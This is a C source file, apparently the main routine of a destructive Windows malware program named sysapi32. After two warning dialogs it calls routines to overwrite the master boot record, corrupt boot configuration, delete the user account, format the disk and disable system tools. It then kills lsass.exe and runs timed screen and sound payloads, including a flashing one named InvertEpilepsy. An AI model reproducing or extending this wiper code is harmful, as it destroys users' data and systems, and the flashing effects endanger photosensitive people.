#include "sysapi32.h"
#include "payloads.h"
#include "gdipayloads.h"

int __stdcall WinMain(HINSTANCE instance, HINSTANCE previnstance, LPSTR lps, int n) {
	if (MessageBoxA(NULL, "You have run the sysapi32.exe malware, which will:\r\n\r\nDisable system tools\r\nOverwrite MBR\r\nCorrupt the boot configuration data\r\nDelete your user account\r\nUnmount the hard disk\r\n\r\nIf you don't want any of that to happen, hit no.\r\nDo you want to run it?", "sysapi32", MB_YESNO | MB_ICONWARNING) == IDNO) {
		return 0;
	}
	else
	{
		if (MessageBoxA(NULL, "Woah woah woah, hold your horses here. Let me read that again... This program contains malicious code that can wipe your data, making your pc useless. Are you sure you want to run it? I am also telling it for the last time so... Will you run, or you will leave, keeping your pc safe?", "sysapi32", MB_YESNO | MB_ICONWARNING) == IDNO) {
			return 0; // message box idea by Drumstickguy
		}
		else
		{
			OverwriteBootRecord();
			DisableSystemTools();
			CorruptBootConfig();
			DeleteUser();
			FormatDisk();
			Sleep(1000);
			CreateThread(0, 0, message, 0, 0, 0);
			Sleep(7000);
			HideTaskbar();
			Sleep(3000);
			CreateThread(0, 0, CursorPayload, 0, 0, 0);
			Sleep(5000);
			HANDLE payload1 = CreateThread(0, 0, Payload1, 0, 0, 0);
			Sound1();
			Sleep(30000);
			dt(payload1);
			InvalidateRect(0, 0, 0);
			HANDLE payload2 = CreateThread(0, 0, Cursors, 0, 0, 0);
			HANDLE payload2b = CreateThread(0, 0, Mirroring, 0, 0, 0);
			HANDLE payload2c = CreateThread(0, 0, Payload2, 0, 0, 0);
			Sound2();
			Sleep(30000);
			dt(payload2); dt(payload2b); dt(payload2c);
			InvalidateRect(0, 0, 0);
			HANDLE payload3 = CreateThread(0, 0, InvertEpilepsy, 0, 0, 0);
			HANDLE payload3b = CreateThread(0, 0, QuadSrcShaking, 0, 0, 0);
			Sound3();
			Sleep(30000);
			dt(payload3); dt(payload3b);
			InvalidateRect(0, 0, 0);
			ShellExecuteA(NULL, "open", "taskkill", "/f /im lsass.exe", NULL, SW_HIDE);
			HANDLE payload4 = CreateThread(0, 0, PRGBQUADShader, 0, 0, 0);
			HANDLE payload4b = CreateThread(0, 0, Text, 0, 0, 0);
			Sound4();
			Sleep(30000);
			dt(payload4); dt(payload4b);
			InvalidateRect(0, 0, 0);
			HANDLE payload5 = CreateThread(0, 0, Blue, 0, 0, 0);
			Beeping();
			Sleep(30000);
		}
	}
}
